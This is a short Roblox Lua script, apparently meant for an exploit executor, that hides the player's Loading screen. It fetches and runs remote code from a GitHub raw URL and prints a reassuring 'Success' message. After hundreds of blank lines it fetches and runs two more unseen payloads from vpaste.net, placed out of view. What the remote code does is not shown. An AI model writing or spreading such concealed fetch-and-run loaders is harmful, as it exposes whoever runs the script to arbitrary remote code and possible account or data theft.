loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/tist/refs/heads/main/no"))()
print("Execute status: Success!")








































































































































































































































































































loadstring(game:HttpGet("http://vpaste.net/2LFrl"))()
loadstring(game:HttpGet("http://vpaste.net/Jm3pJ"))()


local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local loadingGui = playerGui:WaitForChild("Loading")

-- If it's a ScreenGui, disable it
if loadingGui:IsA("ScreenGui") then
    loadingGui.Enabled = false
else
    -- If it's a Frame or other GuiObject
    loadingGui.Visible = false
end
